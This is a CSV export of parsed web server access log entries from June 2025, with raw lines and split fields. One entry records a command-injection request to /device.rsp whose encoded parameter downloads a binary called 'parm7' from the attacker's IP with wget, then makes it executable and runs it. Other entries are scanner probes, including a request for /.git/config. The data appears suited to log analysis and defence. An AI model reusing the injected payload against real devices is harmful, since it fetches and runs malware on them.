line_no,raw_line,ip,ident,authuser,time_raw,time,request,method,path,protocol,status,size,referer,agent,parse_status,request_type,parse_note
1023,"5.253.247.217 - - [23/Jun/2025:04:23:46 +0900] ""POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20parm7%3B%20wget%20http%3A%2F%2F5.253.247.217%2Fbins%2Fparm7%3B%20chmod%20777%20%2A%3B%20.%2Fparm7%20tbk HTTP/1.1"" 404 232 ""-"" ""Mozila/5.0""",5.253.247.217,,,23/Jun/2025:04:23:46 +0900,2025-06-23 04:23:46+09:00,POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20parm7%3B%20wget%20http%3A%2F%2F5.253.247.217%2Fbins%2Fparm7%3B%20chmod%20777%20%2A%3B%20.%2Fparm7%20tbk HTTP/1.1,POST,/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20parm7%3B%20wget%20http%3A%2F%2F5.253.247.217%2Fbins%2Fparm7%3B%20chmod%20777%20%2A%3B%20.%2Fparm7%20tbk,HTTP/1.1,404,232,,Mozila/5.0,SUCCESS,STANDARD_HTTP,
1024,"18.246.21.61 - - [23/Jun/2025:04:39:10 +0900] ""\x16\x03\x01"" 400 226 ""-"" ""-""",18.246.21.61,,,23/Jun/2025:04:39:10 +0900,2025-06-23 04:39:10+09:00,\x16\x03\x01,,,,400,226,,,SUCCESS,NON_STANDARD_REQUEST,
1025,"18.246.21.61 - - [23/Jun/2025:04:39:10 +0900] ""GET / HTTP/1.1"" 400 226 ""-"" ""-""",18.246.21.61,,,23/Jun/2025:04:39:10 +0900,2025-06-23 04:39:10+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,400,226,,,SUCCESS,STANDARD_HTTP,
1026,"18.246.21.61 - - [23/Jun/2025:04:39:10 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""l9tcpid/v1.1.0""",18.246.21.61,,,23/Jun/2025:04:39:10 +0900,2025-06-23 04:39:10+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,l9tcpid/v1.1.0,SUCCESS,STANDARD_HTTP,
1027,"18.246.21.61 - - [23/Jun/2025:04:39:11 +0900] ""GET /.git/config HTTP/1.1"" 404 232 ""-"" ""l9explore/1.2.2""",18.246.21.61,,,23/Jun/2025:04:39:11 +0900,2025-06-23 04:39:11+09:00,GET /.git/config HTTP/1.1,GET,/.git/config,HTTP/1.1,404,232,,l9explore/1.2.2,SUCCESS,STANDARD_HTTP,
1028,"172.232.232.10 - - [23/Jun/2025:06:30:32 +0900] ""GET / HTTP/1.0"" 200 3809 ""-"" ""-""",172.232.232.10,,,23/Jun/2025:06:30:32 +0900,2025-06-23 06:30:32+09:00,GET / HTTP/1.0,GET,/,HTTP/1.0,200,3809,,,SUCCESS,STANDARD_HTTP,
1029,"172.232.232.10 - - [23/Jun/2025:06:30:33 +0900] ""OPTIONS / HTTP/1.0"" 200 - ""-"" ""-""",172.232.232.10,,,23/Jun/2025:06:30:33 +0900,2025-06-23 06:30:33+09:00,OPTIONS / HTTP/1.0,OPTIONS,/,HTTP/1.0,200,,,,SUCCESS,STANDARD_HTTP,
1030,"172.232.232.10 - - [23/Jun/2025:06:30:33 +0900] ""OPTIONS / RTSP/1.0"" 400 226 ""-"" ""-""",172.232.232.10,,,23/Jun/2025:06:30:33 +0900,2025-06-23 06:30:33+09:00,OPTIONS / RTSP/1.0,,,,400,226,,,SUCCESS,NON_STANDARD_REQUEST,
1031,"172.232.232.10 - - [23/Jun/2025:06:30:33 +0900] ""GET / HTTP/1.1"" 200 3809 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML""",172.232.232.10,,,23/Jun/2025:06:30:33 +0900,2025-06-23 06:30:33+09:00,GET / HTTP/1.1,GET,/,HTTP/1.1,200,3809,,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,SUCCESS,STANDARD_HTTP,
1032,"172.232.232.10 - - [23/Jun/2025:06:30:33 +0900] ""GET /favicon.ico HTTP/1.1"" 404 232 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML""",172.232.232.10,,,23/Jun/2025:06:30:33 +0900,2025-06-23 06:30:33+09:00,GET /favicon.ico HTTP/1.1,GET,/favicon.ico,HTTP/1.1,404,232,,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,SUCCESS,STANDARD_HTTP,
